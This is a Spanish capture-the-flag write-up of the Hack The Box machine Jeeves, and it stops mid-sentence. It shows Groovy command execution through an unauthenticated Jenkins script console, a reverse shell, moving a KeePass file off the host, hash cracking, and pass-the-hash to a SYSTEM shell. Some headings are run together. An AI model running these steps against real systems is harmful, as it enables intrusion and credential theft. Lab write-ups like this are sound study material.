---
title: HTB - Jeeves
excerpt: "Jeeves fue lanzada en 2017. Comenzamos con un servidor web y encontramos una instancia de Jenkins sin autenticaciÃ³n en un puerto alternativo. Podemos abusar de la consola de scripts de Jenkins para obtener ejecuciÃ³n de comandos y una shell remota. Desde allÃ­, encontramos una base de datos de KeePass, extraemos un hash que podemos usar para hacer Pass-The-Hash y obtener ejecuciÃ³n como Administrador. El archivo `root.txt` estÃ¡ oculto utilizando Alternative Data Streams (ADS)"
date: 2020-12-13
classes: wide
header:
  teaser: /assets/images/htb-jeeves/jeeves.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - htb-jeeves 
  - hackthebox 
  - ctf nmap 
  - windows
  - feroxbuster 
  - gobuster 
---


Jeeves fue lanzada en 2017. Comenzamos con un servidor web y encontramos una instancia de Jenkins sin autenticaciÃ³n en un puerto alternativo. Podemos abusar de la consola de scripts de Jenkins para obtener ejecuciÃ³n de comandos y una shell remota. Desde allÃ­, encontramos una base de datos de KeePass, extraemos un hash que podemos usar para hacer Pass-The-Hash y obtener ejecuciÃ³n como Administrador. El archivo `root.txt` estÃ¡ oculto utilizando Alternative Data Streams (ADS)

# HTB: Jeeves

**InformaciÃ³n de la MÃ¡quina**


| Nombre       | [Jeeves](https://app.hackthebox.com/machines/Jeeves) |
|--------------|:---:|
| Fecha de Lanzamiento | 12 Ago 2017 |
| Fecha de Retiro | 11 Nov, 2017 |
| SO           | Windows |
| Puntos Base  | Medium [30] |
| Creador      | [mrb3n8132](https://app.hackthebox.com/users/2984) |


[Owned Zero from Hack The Box!](https://labs.hackthebox.com/achievement/machine/2117389/114)


## Reconocimiento

### Nmap

nmap encuentra cuatro puertos TCP abiertos: HTTP (80), SMB/RPC (135/445) y otro servidor web Jetty (50000):

```console
$  nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.37.234  -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 05:36 CST
Initiating SYN Stealth Scan at 05:36
Scanning 10.129.37.234 [65535 ports]
Discovered open port 80/tcp on 10.129.37.234
Discovered open port 445/tcp on 10.129.37.234
Discovered open port 135/tcp on 10.129.37.234
Discovered open port 50000/tcp on 10.129.37.234
Completed SYN Stealth Scan at 05:36, 26.46s elapsed (65535 total ports)
Nmap scan report for 10.129.37.234
Host is up, received user-set (0.13s latency).
Scanned at 2025-12-16 05:36:21 CST for 27s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 23 (1.012KB)

```
<p align="center">
<img src="/assets//images/htb-jeeves/nmap.png">
</p> 

```console
$ ./extractPorts.sh  allPorts

[*] Extracting information...

        [*] IP Address: 10.129.37.234
        [*] Open ports: 80,135,445,50000

[*] Ports copied to clipboard

```

Escaneo detallado de los puertos encontrados:

```console
$ nmap -sCV -p80,135,445,50000 10.129.37.234
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 05:38 CST
Nmap scan report for 10.129.37.234
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-16T16:38:30
|_  start_date: 2025-12-16T16:25:39
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m26s, deviation: 0s, median: 4h59m26s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.49 seconds

```

<p align="center">
<img src="/assets//images/htb-jeeves/nmap2.png">
</p>

### Sitio Web (TCP 80)

El servidor web devuelve un motor de bÃºsqueda con apariencia de "Pregunta a Jeeves":
Cualquier cosa que envÃ­es realiza una peticiÃ³n GET a `/error.html`. Es una pÃ¡gina simple con una imagen que parece un error de ASP.NET sobre un fallo de conexiÃ³n a MSSQL. Este formulario no parece Ãºtil.

<p align="center">
<img src="/assets//images/htb-jeeves/web.png">
</p> 

### HTTP - TCP 50000 La pÃ¡gina en el puerto 50000 devuelve un error 404, pero las cabeceras revelan que es **Jetty**, un servidor web Java.

#### Fuzzing de Directorios El uso de wordlists estÃ¡ndar modernas (como `raft-medium`) con herramientas como `feroxbuster` no encuentra nada.

<p align="center">
<img src="/assets//images/htb-jeeves/feroxbuster.png">
</p> 

#### Sin embargo, usando una lista mÃ¡s antigua (comÃºn en 2017) como `directory-list-2.3-medium.txt` de `dirbuster`, encontramos algo interesante:

<p align="center">
<img src="/assets//images/htb-jeeves/gobuster.png">
</p> 

```bash
gobuster -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

/askjeeves (Status: 302)

```

La ruta `/askjeeves` nos lleva a una instancia de **Jenkins**.

<p align="center">
<img src="/assets//images/htb-jeeves/cmd (1).png">
</p> 

---

## Shell como kohsuke
### Primero, hago clic en "Nuevo elemento" y en el siguiente formulario le pongo un nombre (no importa quÃ©, simplemente usarÃ© "flippermen"), y seleccionarÃ© "Proyecto Freestyle" como tipo.


<p align="center">
<img src="/assets//images/htb-jeeves/cmd (2).png">
</p> 

Al final, voy a "AÃ±adir paso de compilaciÃ³n" y seleccionarÃ© "Ejecutar el comando batch de Windows"

<p align="center">
<img src="/assets//images/htb-jeeves/cmd (3).png">
</p> 


Run Job
#### En Object, Jenkins estaba configurado de tal forma que "Construir ahora" no era una opciÃ³n. AquÃ­ estÃ¡:
#### Al hacer clic ahÃ­, aparece en el historial de compilaciones (he hecho dos clics, ups):

<p align="center">
<img src="/assets//images/htb-jeeves/cmd (5).png">
</p> 

#### Al hacer clic en uno y ir a "Salida de consola" se muestran los resultados del comando:

<p align="center">
<img src="/assets//images/htb-jeeves/cmd (6).png">
</p> 

### EjecuciÃ³n mediante Consola de Scripts [2]
#### Desde el menÃº principal izquierdo del panel de control, harÃ© clic en "Gestionar a Jenkins":

imagen-20220413062516108
#### Un poco mÃ¡s de la mitad estÃ¡ "Script Console":

imagen-20220413062543265
#### Da una caja para poner en scripts Groovy. Para ejecutar un comando en el host, introduzco , y hago clic en ejecutar:println "cmd.exe /c whoami".execute().text



<p align="center">
<img src="/assets//images/htb-jeeves/cmd (4).png">
</p>


Esto nos da una caja de texto para introducir scripts en **Groovy**. Para ejecutar un comando en el host, podemos ingresar:

```groovy
println "cmd.exe /c whoami".execute().text

```

Al hacer clic en "Run", vemos el resultado en la pÃ¡gina.

###Obtener Reverse ShellPodemos generar un payload de PowerShell (por ejemplo, usando [revshells.com](https://www.revshells.com/)). Pegamos el comando en la consola de scripts de Groovy.

1. Inicia un listener: `sudo rlwrap -cAr nc -lvnp 445`
2. Ejecuta el script malicioso en Jenkins.

```bash
Connection received on 10.10.10.63 49676
whoami
jeeves\kohsuke

```

Estamos dentro como el usuario `kohsuke`. Podemos ir a su escritorio y leer `user.txt`.

```powershell
PS C:\Users\kohsuke\desktop> cat user.txt
e3232272************************

```

---

##Shell como Administrator###EnumeraciÃ³nMirando en el directorio de documentos de Kohsuke, encontramos un archivo interesante:

```powershell
PS C:\Users\kohsuke\Documents> ls
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx

```

Es una base de datos de **KeePass** (`.kdbx`), un gestor de contraseÃ±as local.

###ExfiltraciÃ³nPara sacar el archivo de la mÃ¡quina Windows, podemos copiarlo al directorio de trabajo de Jenkins (que es accesible vÃ­a web):

```powershell
copy \users\kohsuke\Documents\CEH.kdbx C:\Users\Administrator\.jenkins\workspace\0xdf\

```

Luego, desde la interfaz web de Jenkins, vamos al "Workspace" del proyecto y descargamos el archivo `CEH.kdbx`.

###Cracking de la ContraseÃ±a MaestraNecesitamos la contraseÃ±a maestra para abrir la base de datos. Usamos `keepass2john` para extraer el hash y luego `hashcat` para romperlo.

1. **Extraer hash:**
```bash
keepass2john CEH.kdbx > CEH.kdbx.hash

```


2. **Crackear hash (Modo 13400):**
```bash
hashcat -m 13400 CEH.kdbx.hash /usr/share/wordlists/rockyou.txt

```



El resultado es la contraseÃ±a: **`moonshine1`**.

###Extraer ContraseÃ±asUsamos `kpcli` para abrir la base de datos con la contraseÃ±a encontrada.

```bash
kpcli --kdb CEH.kdbx
# Ingresa 'moonshine1'
kpcli:/> find .
# Muestra varias entradas.

```

Al inspeccionar las entradas, la entrada "Backup stuff" llama la atenciÃ³n:

```text
Title: Backup stuff
Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

```

###Pass The HashLa "contraseÃ±a" encontrada (`aad3b...:e0fb...`) es en realidad un hash NTLM de Windows (formato `LM:NT`).

* `aad3b435b51404eeaad3b435b51404ee`: Hash LM vacÃ­o (aad3b...).
* `e0fb1fb85756c24235ff238cbe81fe00`: Hash NT del password real.

Podemos usar este hash directamente para autenticarnos sin saber la contraseÃ±a en texto claro (**Pass The Hash**). Probamos con `crackmapexec`:

```bash
crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

```

Resultado: `(Pwn3d!)`. Tenemos acceso de administrador.

###Obtener Shell de SistemaUsamos `psexec.py` de Impacket para obtener una shell interactiva:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe

C:\Windows\system32> whoami
nt authority\system

```

---

##Flag de Root (ADS)Al ir al escritorio del Administrador, no estÃ¡ 
